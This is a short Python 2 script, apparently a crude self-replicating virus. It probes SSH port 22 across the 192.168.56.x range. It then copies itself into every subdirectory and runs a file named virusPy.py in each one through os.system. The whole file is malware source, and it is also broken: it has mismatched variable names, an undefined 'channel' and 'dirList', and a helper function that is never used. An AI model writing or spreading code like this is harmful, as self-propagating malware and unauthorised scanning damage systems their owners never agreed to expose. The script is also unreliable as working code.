import os
import sys
import socket
PORT =22

def connectSock(listIP):

    for ip in listIp:
        s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.settimeout(0.5)
            s.connect((ip, PORT))
            print "Connected to : "+ip

            print channel.read(1024)
            s.close()
        except:
            print "cannot connect to ip : "+ip
            s.close()
            continue
        
def listVMS(current):
    liste = []
    dirList= []
    liste = os.listdir(current)
    for test in liste:
        if os.path.isdir(test):
            dirList.append(test)
    return dirList 

def colonize(dirList, virus):
    for elt in dirList:
        print elt
        cmd = "cp "+virus+" "+elt+"/"
        os.system(cmd)
        cmd = elt+"/"
        os.chdir(cmd)
        os.system("python virusPy.py")
        os.chdir("..")

if __name__=="__main__":
        #dirList=[]
        #dirList = listDirectories('.')
        listIp=[]
        for elt in range(102,255):
            listIp.append("192.168.56."+str(elt))
        connectSock(listIp)
        colonize(dirList, sys.argv[0])
